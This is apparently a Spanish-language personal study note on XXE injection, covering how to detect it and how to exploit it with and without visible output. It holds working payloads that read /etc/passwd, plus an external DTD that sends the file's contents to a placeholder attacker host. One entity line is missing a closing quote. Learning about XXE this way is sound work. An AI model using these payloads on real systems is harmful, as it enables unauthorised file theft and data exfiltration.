---------
- Tags: #OWASP_TOP_10 #vulnerabilidad #hacking #XEE
--------------
# Definición

> Es una [[Vulnerabilidades web]] en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.
> 
> Normalmente implica una **inyección** de una entidad **XML** maliciosa en una solicitud HTTP, siendo procesada por el servidor con la posibilidad de resultar en la exposición de información interesante. Un ejemplo podría ser la inyección de una entidad **XML** haciendo referencia a un archivo del servidor pudiendo obtener información del mismo archivo.
> 
> Un caso común en el que se puede explotar **XXE** es cuando el servicio web no validad la entrada de archivos **XML** que recibe. Así, el atacante puede inyectar una entidad **XML** maliciosa. 
> 
> En algunos casos el atacante deberá ir **a ciegas** para obtener información confidencial, ya que no siempre los ataques **XXE** resultan en la exposición directa de información sensible en la respuesta del servidor. Una forma común de proceder, es enviar peticiones diseñadas desde el servidor para conectarse a un **Document Type Definition (DTD)** definido externamente, utilizado para validar la estructura de un archivo **XML**, pudiendo contener referencias a recursos externos. Es una técnica algo más complicada, aunque podría ser efectiva en casos donde el atacante tiene una idea de los recursos disponibles del sistema.
> ,
> En algunos otros casos, un ataque **XXE** puede ser utilizado para desencadenar en una vulnerabilidad de tipo [[SSRF (Server-Side Request Forgery)]], permitiendo a un atacante escanear **puertos internos** de una máquina que normalmente está protegida por un firewall.


----
# Detección de vulnerabilidad

Para detectar la vulnerabilidad, será necesario el envío de una entidad **XML**, que puede ser interceptado con [[Burpsuite]]. La petición podría tener la siguiente forma, mostrando o no por pantalla datos interesantes una vez enviada la entidad **XML** (dependiendo del caso nos encontraríamos con un ataque normal o uno **a ciegas**):

```xml
<?xml version="1.0" encoding="UTF-8"?>
   <root>
     <name>
       test
     </name>
     <tel>
       123456789
     </tel>
     <email>
       test@test
    </email>
     <password>
       test123
     </password>
  </root>
```

Si se mostrase algún campo introducido en la respuesta de la solicitud, podríamos intentar explotar la vulnerabilidad, pero si no se viese, sería un poco más complicado y tendríamos que ir **a ciegas**.

En **XML**, existen lo que se conocen como **entidades**, que vienen a ser como una especie de variable que referencia a otro campo o dato, por ejemplo, si quisiéramos crear una entidad llamada **myName** con nombre **nombre**, tendríamos que proporcionar la siguiente línea:

```xml
<!DOCTYPE foo [<!ENTITY myName "nombre">]>
```

Y para acceder al contenido de ella, simplemente ponemos un *&* delante del nombre de la entidad, por ejemplo:

```xml 
&myName
```

----------
# Explotación con output

La gracia de las **entidades**, es el hecho de que podemos utilizarlos para mostrar archivos del propio sistema, por ejemplo, para guardar en una entidad el contenido del archivo /etc/passwd, podemos hacer uso de la siguiente sentencia:

```xml
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
```

Si quisiéramos crear una nueva entidad con el contenido del mismo directorio, solo que ahora cifrado en **base64** (para que sea más cómodo), podemos utilizar lo siguiente:

```xml
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd>]>
```

De manera que si pudiéramos ver algún campo que hemos introducido en la respuesta de la página web, podemos llamarlo como hemos mencionado anteriormente y ver el contenido del mismo, por ejemplo con el ejemplo del principio:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
   <root>
     <name>
       test
     </name>
     <tel>
       123456789
     </tel>
     <email>
       &myFile
    </email>
     <password>
       test123
     </password>
  </root>
```

Suponiendo que el campo que visualizamos es el de *email*.

Podemos utilizar distintos [[Wrappers]] en las entidades (en los dos ejemplos hemos utilizados distintos), que se utilizan usualmente en la vulnerabilidad [[LFI (Local File Inclusion)]].


La cosa es que no siempre en la página web nos permiten inyectar **entidades** (la misma página te puede lanzar un mensaje informando de lo mismo), por lo que pasaríamos a realizar una explotación **a ciegas (OOB)**.

-----------
# Explotación a ciegas (XXE OOB Blind)

Para proceder con la explotación **a ciegas**, haremos uso de las externals **DTD**. Ya que no podemos ver el output de la respuesta en la página web, el objetivo va a ser que la máquina remota nos mande por una petición **GET**, dicha información. 

Podemos crear la siguiente entidad, y teniendo previamente montado un servidor HTTP, deberíamos ser capaces de ver dicha solicitud una vez haya sido enviada nuestra entidad **XML**:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<IP_ATACANTE>/malicious.dtd"> %xxe;]>
```

De manera que si creamos el **DTD** de la siguiente forma, nos llegaría el contenido de /etc/passwd en **base64**:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<IP_ATACANTE>/?file=%file;'>"> 
%eval; 
%exfil;
```

Puede ser un poco tedioso tener que realizar este proceso continuamente y tener que descifrar el mensaje en **base64**, por lo que podemos hacer uso del script [[xxe_oob.sh]], de manera que está todo automatizado.

--------
# Ejemplos prácticos 

[XXE Lab](https://github.com/jbarone/xxelab)